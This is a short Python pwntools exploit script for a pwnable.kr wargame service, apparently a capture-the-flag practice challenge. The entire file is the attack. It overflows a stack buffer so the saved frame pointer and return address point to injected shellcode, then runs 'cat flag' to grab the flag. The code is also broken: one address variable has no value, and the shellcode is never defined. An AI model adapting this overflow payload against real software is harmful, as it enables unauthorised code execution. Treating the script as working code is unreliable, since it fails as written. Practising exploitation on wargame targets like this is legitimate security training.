from pwn import *

from pwnlib.util.packing import p32, p64
context(arch='amd64', os='linux')  # need to specify this for compilation
io = remote("pwnable.kr", 9010)

echoinputaddr = 0x400837
writeablefuncaddr =

namebuffer = b'abcdefghijklmnopqrstuvwxy'
buffer = b'abcdefghijklmnopqrstuvwxyzABCDEF' + \
          p64(writeablefuncaddr + 0x20) + \
          p64(echoinputaddr) + \
          p64(writeablefuncaddr)
io.recvuntil("hey, what's your name? : ")
io.sendline(namebuffer)
print(f'menu list: {io.recvuntil("> ")}')
io.sendline('1')
io.sendline(buffer)
io.sendline(asm(shellcode))
io.sendline(b'cat flag')
print(f'FINAL FLAG: {io.recv()}')
